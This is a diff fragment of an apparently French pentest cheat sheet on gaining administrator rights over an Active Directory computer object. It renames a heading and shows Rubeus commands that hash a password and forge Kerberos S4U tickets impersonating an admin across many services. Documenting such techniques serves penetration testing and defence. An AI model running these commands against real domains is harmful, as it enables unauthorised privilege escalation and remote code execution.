@@ -31,7 +31,7 @@ _**Objectif :** Devenir administrateur de l'objet ordinateur (\<MACHINE-CIBLE>).
 #### Conversion du mot de passe 123456 au format RC4
 #>./Rubeus.exe hash /password:123456 /user:&#x3C;FAKE-MACHINE> /domain:&#x3C;DOMAINE>
 
-#### Génération des tickets Kerberos
+#### Génération des tickets Kerberos et RCE
 ##### Windows
 #>./Rubeus.exe s4u /user:&#x3C;FAKE-MACHINE> /rc4:&#x3C;RC4-PASSWORD> /impersonateuser:&#x3C;ADMIN-MACHINE-CIBLE> /msdsspn:cifs/&#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE> /domain:&#x3C;DOMAINE> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
 ##### Linux
